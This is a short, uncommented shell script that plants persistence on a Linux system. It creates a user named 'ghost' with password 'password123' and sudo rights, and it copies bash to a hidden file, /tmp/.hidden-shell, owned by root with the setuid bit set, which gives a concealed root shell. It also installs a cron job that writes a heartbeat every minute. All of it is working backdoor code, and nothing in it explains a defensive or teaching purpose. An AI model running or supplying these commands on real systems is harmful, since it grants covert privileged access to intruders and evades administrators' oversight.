sudo useradd -m -s /bin/bash ghost
echo "ghost:password123" | sudo chpasswd
sudo usermod -aG sudo ghost
sudo cp /bin/bash /tmp/.hidden-shell
sudo chmod u+s /tmp/.hidden-shell
sudo chown root:root /tmp/.hidden-shell
echo "* * * * * echo 'alive' >> /tmp/.heartbeat" | sudo crontab -u ghost -
